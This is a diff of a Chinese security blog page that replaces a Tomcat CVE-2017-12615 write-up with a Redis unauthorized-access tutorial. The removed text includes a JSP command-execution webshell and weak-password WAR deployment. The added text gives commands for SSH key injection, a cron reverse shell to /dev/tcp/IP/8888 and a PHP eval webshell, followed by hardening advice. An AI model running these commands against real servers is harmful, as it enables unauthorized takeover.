@@ -86,25 +86,22 @@
 
 
 
-<meta name="description" content="cve-2017-12615、tomcat管理后台getshell">
+<meta name="description" content="redis攻击方法，防御措施">
 <meta name="keywords" content="漏洞复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Tomcat">
-<meta property="og:url" content="http://yoursite.com/2018/08/01/Tomcat/index.html">
+<meta property="og:title" content="Redis未授权访问">
+<meta property="og:url" content="http://yoursite.com/2018/08/02/redis未授权访问/index.html">
 <meta property="og:site_name" content="BEHIND THE GROWTH">
-<meta property="og:description" content="cve-2017-12615、tomcat管理后台getshell">
+<meta property="og:description" content="redis攻击方法，防御措施">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/put1.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/shell.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/tomcatManager.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/manager.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/war.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/shell2.png">
-<meta property="og:updated_time" content="2018-07-31T09:28:12.572Z">
+<meta property="og:image" content="http://yoursite.com/2018/08/02/redis未授权访问/redisInfo.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/02/redis未授权访问/info.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/02/redis未授权访问/fuxian.png">
+<meta property="og:updated_time" content="2018-08-19T07:45:52.142Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Tomcat">
-<meta name="twitter:description" content="cve-2017-12615、tomcat管理后台getshell">
-<meta name="twitter:image" content="http://yoursite.com/2018/07/31/Tomcat/put1.png">
+<meta name="twitter:title" content="Redis未授权访问">
+<meta name="twitter:description" content="redis攻击方法，防御措施">
+<meta name="twitter:image" content="http://yoursite.com/2018/08/02/redis未授权访问/redisInfo.png">
 
 
 
@@ -134,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/08/01/Tomcat/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/08/02/redis未授权访问/"/>
 
 
 
 
 
-  <title>Tomcat | BEHIND THE GROWTH</title>
+  <title>Redis未授权访问 | BEHIND THE GROWTH</title>
   
 
 
@@ -267,7 +264,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/01/Tomcat/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/02/redis未授权访问/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="WyyFree">
@@ -284,7 +281,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Tomcat</h1>
+          <h1 class="post-title" itemprop="name headline">Redis未授权访问</h1>
         
 
         <div class="post-meta">
@@ -296,8 +293,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-01T04:24:00+08:00">
-                2018-08-01
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-02T23:37:00+08:00">
+                2018-08-02
               </time>
             
 
@@ -343,7 +340,7 @@
 
           
               <div class="post-description">
-                  cve-2017-12615、tomcat管理后台getshell
+                  redis攻击方法，防御措施
               </div>
           
 
@@ -360,60 +357,65 @@
       
 
       
-        <p><hr></p>
-<center>
-
-<h2 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h2><p></p></center><p></p>
+        <ul>
+<li>造成漏洞原因<br>Redis配置不当导致未授权访问，redis默认是没有开启认证模式，如果服务器将监听端口绑定在0.0.0.0:6397下就可以直接通过客户端工具连接进行非授权访问操作，如果redis权限过大可以直至写入后门程序或者直接暴露系统权限</li>
+</ul>
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><ul>
+<li>可利用hydra进行redis密码爆破</li>
+<li>利用nmap进行探测<pre><code>nmap -A -p 6379 --script=redis-info IP
+</code></pre></li>
+</ul>
+<p><img src="/2018/08/02/redis未授权访问/redisInfo.png" alt="info"></p>
 <ul>
-<li>原理</li>
+<li>使用客户端工具进行连接<pre><code>redis-cli -h IP [-p PORT]
+</code></pre>基本操作指令<pre><code>设置KEYS值
+1、set key VALUE
+2、cat /tmp/foo.txt | redis-cli -h 192.168.1.100 -p 6379 -x set crackit
+获取、查看、删除KEYS值
+KEYS * 
+get VALUE
+del VALUE
+获取、设置config选项
+获取当前路径：config get dir
+设置当前路径：config set dir PATH
+保存为文件
+config set dbfilename NAME
+save
+</code></pre></li>
 </ul>
-<p>Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件(PUT)<br>Tomcat版本：8.5.19</p>
-<pre><code>&lt;servlet&gt;
-    &lt;servlet-name&gt;default&lt;/servlet-name&gt;
-    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;debug&lt;/param-name&gt;
-        &lt;param-value&gt;0&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;listings&lt;/param-name&gt;
-        &lt;param-value&gt;false&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;readonly&lt;/param-name&gt;
-        &lt;param-value&gt;false&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
-&lt;/servlet&gt;
-</code></pre><ul>
-<li>复现</li>
-</ul>
-<p>虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用<code>/</code>）来绕过了限制。<br>jsbWebshell</p>
-<pre><code>&lt;%
-    if(&quot;0617&quot;.equals(request.getParameter(&quot;pwd&quot;))){
-        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
-        int a = -1;
-        byte[] b = new byte[2048];
-        out.print(&quot;&lt;pre&gt;&quot;);
-        while((a=in.read(b))!=-1){
-            out.println(new String(b));
-        }
-        out.print(&quot;&lt;/pre&gt;&quot;);
-    }
-%&gt;
-</code></pre><p><img src="/2018/07/31/Tomcat/put1.png" alt="PUT"><br>访问上传的后门<br><img src="/2018/07/31/Tomcat/shell.png" alt="shell"></p>
-<p><hr></p>
-<center>
-
-<h2 id="Tomcat后台弱口令-amp-amp-后台getshell"><a href="#Tomcat后台弱口令-amp-amp-后台getshell" class="headerlink" title="Tomcat后台弱口令 &amp;&amp; 后台getshell"></a>Tomcat后台弱口令 &amp;&amp; 后台getshell</h2><p></p></center><p></p>
+<p><img src="/2018/08/02/redis未授权访问/info.png" alt="info"></p>
 <ul>
-<li>后台弱口令</li>
+<li>写入ssh公钥<br>原理：在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。<br>1、生成key<pre><code>ssh-keygen -t rsa
+</code></pre>2、将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合）,再把key.txt文件内容写入目标主机的缓冲里：<pre><code>(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt
+cat foo.txt | redis-cli -h 192.168.10.153 -x set keyValue
+</code></pre>3、<strong>连接到redis服务器，将缓存写入文件</strong><pre><code>redis-cli -h IP
+config set dir /root/.ssh
+config set dbfilename authorized_keys
+名字必需是authorized_keys
+</code></pre>4、ssh使用公钥访问<pre><code>ssh root@IP -i id_rsa
+</code></pre></li>
 </ul>
-<p>Tomcat后台：<a href="http://ip:8080/manager/html" target="_blank" rel="noopener">http://ip:8080/manager/html</a><br>弱口令：tomcat/tomcat<br>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。<br>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。<br><img src="/2018/07/31/Tomcat/tomcatManager.png" alt="conf"></p>
+<p><img src="/2018/08/02/redis未授权访问/fuxian.png" alt="fuxian"></p>
 <ul>
-<li>后台上传war getshell</li>
+<li>写入反弹shell<br>重复上面步骤3<pre><code>set nc &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/IP/8888 0&gt;&amp;1\n\n&quot;
+</code></pre></li>
+<li>写入webshell<br>重复上面步骤3<pre><code>set webshell &quot;\n\n\n&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;\n\n\n&quot;
+</code></pre></li>
 </ul>
-<p>1、制作war包<br>将1.jsp压缩成zip格式，将zip重命名为war -&gt; 1.war<br>2、后台上传<br><img src="/2018/07/31/Tomcat/manager.png" alt="manager"><br><img src="/2018/07/31/Tomcat/war.png" alt="war"><br>3、访问1.jsp<br><img src="/2018/07/31/Tomcat/shell2.png" alt="shell"></p>
+<h2 id="开启日志、设置防御"><a href="#开启日志、设置防御" class="headerlink" title="开启日志、设置防御"></a>开启日志、设置防御</h2><ul>
+<li>开启log访问日志(redis.conf)<pre><code>loglevel verbose
+logfile &quot;PATH&quot;
+</code></pre></li>
+<li>防御措施<br>1、禁用一些redis高危指令，或者修改指令名称(redis.conf)<pre><code>rename-command FLUSHALL &quot;&quot;
+rename-command CONFIG &quot;&quot;
+rename-command EVAL &quot;&quot;
+</code></pre>2、以最低权限运行redis<pre><code>groupadd -r redis &amp;&amp; useradd -r -g redis redis
+su - redis-c &quot; /redis/bin/redis-server /redis/etc/redis.conf&quot;
+</code></pre>3、添加redis密码<pre><code>requirepass PASSWD
+</code></pre>4、禁止外网访问，修改默认端口<pre><code>bind 127.0.0.1
+Port PORT
+</code></pre>5、设置防火墙策略</li>
+</ul>
 
       
     </div>
@@ -444,8 +446,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/30/日志分析/" rel="next" title="日志分析">
-                <i class="fa fa-chevron-left"></i> 日志分析
+              <a href="/2018/07/31/Tomcat/" rel="next" title="Tomcat">
+                <i class="fa fa-chevron-left"></i> Tomcat
               </a>
             
           </div>
@@ -453,10 +455,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/08/03/redis未授权访问/" rel="prev" title="Redis未授权访问">
-                Redis未授权访问 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -592,7 +590,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-12615"><span class="nav-number">1.</span> <span class="nav-text">CVE-2017-12615</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat后台弱口令-amp-amp-后台getshell"><span class="nav-number">2.</span> <span class="nav-text">Tomcat后台弱口令 &amp;&amp; 后台getshell</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击方法"><span class="nav-number">1.</span> <span class="nav-text">攻击方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开启日志、设置防御"><span class="nav-number">2.</span> <span class="nav-text">开启日志、设置防御</span></a></li></ol></div>
             
 
           </div>
